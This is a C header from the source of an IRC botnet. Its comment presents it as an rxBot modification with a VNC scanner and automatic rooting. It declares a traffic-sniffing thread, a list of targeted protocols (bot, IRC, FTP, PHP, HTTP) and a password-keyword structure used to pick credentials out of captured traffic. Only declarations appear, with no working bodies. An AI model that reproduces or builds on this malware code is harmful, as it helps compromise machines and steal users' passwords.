/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_PSNIFF
// sniffing structure
typedef struct PSNIFF
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PSNIFF;

enum {UNKNOWN,BOTP,IRCP,FTPP,PHPP,HTTPP};

typedef struct PSWORDS
{
	char text[20];
	int type;

} PSWORDS;


DWORD WINAPI SniffThread(LPVOID param);
#endif
